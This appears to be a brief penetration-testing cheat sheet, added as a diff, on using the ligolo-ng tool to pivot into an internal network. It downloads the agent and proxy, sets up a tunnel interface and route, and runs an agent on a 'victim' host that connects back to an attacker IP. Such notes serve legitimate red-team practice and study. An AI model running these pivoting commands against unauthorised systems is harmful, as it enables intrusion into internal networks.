@@ -1,0 +1,27 @@
+ Best tool to be used for Pivorting the Internal Network. 
+
+After downloading the Agent tool  
+    sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
+
+And proxy file 
+    sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
+
+We can start the tool for Pivoting. But, before that we need to start the tunnel interface 
+        sudo ip tuntap add user [your_username] mode tun ligolo
+        sudo ip link set ligolo up
+
+
+step 1) On kali machine, start the proxy 
+      ./lin-proxy -selfcert -laddr 0.0.0.0:<Port>
+
+Step 2) Add route pointing to tunnel interface 
+      sudo ip route add 192.168.110.0/24 dev ligolo
+
+
+Step 3) Start the connection form the victim back to kali 
+        ./lin-agent -connect <attacker IP here>:<Port> -ignore-cert
+
+Step 4) Afer this we select the session 
+      session 1/2/3
+
+    
